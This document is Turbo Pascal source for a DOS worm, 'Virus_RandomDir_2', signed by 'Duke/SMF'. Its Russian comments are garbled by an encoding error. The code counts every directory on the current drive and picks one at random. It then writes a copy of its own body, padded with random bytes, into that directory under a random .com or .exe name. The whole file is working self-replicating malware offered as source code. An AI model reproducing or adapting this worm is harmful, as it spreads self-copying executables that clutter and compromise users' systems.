   {$I-,S-}
   program Virus_RandomDir_2;
   uses dos;
   const VirLen=5424;
   var Kol,               {ª®«-¢® ¤¨à¥ªâ®à¨©   ¤¨áª¥}
       K,M:integer;
       NewName,           {¨¬ï á®§¤ ¢ ¥¬®£® ç¥à¢ï}
       Disk,              {â¥ªãé¨© ¤¨áª}
       P:string;          { ©¤¥ ï ¤¨à¥ªâ®à¨ï}
   {---------------------------------------------------------------------------}
   procedure ScanTree(Dir:string);
   var N:searchrec;
   begin
   Kol:=Kol+1;
   {¨áª âì ¤àã£¨¥ (¢«®¦¥ë¥) ¤¨à¥ªâ®à¨¨:}
   if Dir[length(Dir)]<>'\'then Dir:=Dir+'\';
   findfirst(Dir+'*.*',$3F,N);
   while doserror=0 do
     begin
     with N do if (Attr and 16<>0) and (Name[1]<>'.')         { è«¨ ¤¨à¥ªâ®à¨î}
       then ScanTree(Dir+Name);
     findnext(N);
     end;
   end;
   {---------------------------------------------------------------------------}
   procedure MakeRandomName;                             {á®§¤ âì á«ãç ©®¥ ¨¬ï}
   var i,d:byte;
   begin
   d:=random(8)+1;
   NewName:='[HLLW.RanDir-2 (c) by Duke/SMF]';                {¬®¨ ª®¯¨à ©âë ;)}
   NewName:='';
   for i:=1 to d do NewName:=NewName+chr(random(26)+97);
   d:=random(255);
   if d div 2 = d/2 then NewName:=NewName+'.com' else NewName:=NewName+'.exe';
   end;
   {---------------------------------------------------------------------------}
   procedure FindDir(Dir:string);                     {¨áª âì ã¦ãî ¤¨à¥ªâ®à¨î}
   var N:searchrec;
   begin
   M:=M+1;
   if M=K then P:=Dir;
   if M<K then
     begin
     if Dir[length(Dir)]<>'\'then Dir:=Dir+'\';
     findfirst(Dir+'*.*',$3F,N);
     while doserror=0 do
       begin
       with N do if (Attr and 16<>0) and (Name[1]<>'.')
         then FindDir(Dir+Name);
       if M<K then findnext(N);
       end;
     end;
   end;
   {---------------------------------------------------------------------------}
   procedure MakeWorm;                   {á®§¤ ¥¬ ç¥à¢ï}
   var f:file;
       C:byte;
       Body:array[1..VirLen] of byte;
   begin
   NewName:=P+'\'+NewName;               {¤®¯®«ï¥¬ ¨¬ï ¯ãâ¥¬}
   assign(f,paramstr(0));reset(f,VirLen);
   blockread(f,Body,1);
   close(f);
   assign(f,NewName);rewrite(f,1);
   blockwrite(f,Body,VirLen);
   for M:=0 to random(1000) do
     begin
     C:=random(255);
     blockwrite(f,C,1);
     end;
   close(f);
   end;
   {---------------------------------------------------------------------------}
   begin
   Kol:=0;                               {¯®ª  çâ®  ©¤¥® 0 ¤¨à¥ªâ®à¨©}
   Disk:=copy(fexpand(paramstr(0)),1,2); {®¯à¥¤¥«¨«¨ ¨¬ï ¤¨áª }
   ScanTree(Disk);                       {áç¨â ¥¬ ª®«-¢® ¤¨à¥ªâ®à¨©}
   Randomize;                            {¨¨æ¨¨àã¥¬ random-£¥¥à â®à}
   MakeRandomName;                       {á®§¤ ¥¬ á«ãç ©®¥ ¨¬ï}
   K:=random(Kol);                       {¡¥à¥¬ á«ãç ©®¥ ç¨á«® ®â 0 ¤® Kol}
   M:=0;                                 {¯®ª  çâ®  ©¤¥  0-ï ¤¨à¥ªâ®à¨ï}
   FindDir(Disk);                        {¨é¥¬ K-î ¤¨à¥ªâ®à¨î}
   MakeWorm;                             {á®§¤ ¥¬ ç¥à¢ï}
   end.
